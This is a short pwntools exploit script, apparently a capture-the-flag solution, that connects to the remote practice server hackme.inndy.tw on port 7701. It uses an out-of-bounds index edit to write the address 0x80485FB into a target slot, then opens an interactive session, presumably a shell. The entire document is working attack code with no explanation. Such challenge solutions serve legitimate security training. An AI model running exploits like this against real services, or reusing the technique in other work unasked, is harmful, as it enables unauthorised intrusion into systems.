from pwn import *

p=remote("hackme.inndy.tw",7701)

p.sendlineafter("What's your name? ","aaaa")
p.sendlineafter(" > ","1")
p.sendlineafter("Index to edit: ","14")
p.sendlineafter("How many? ",str(0x80485FB))
p.sendlineafter(" > ","0")
p.interactive()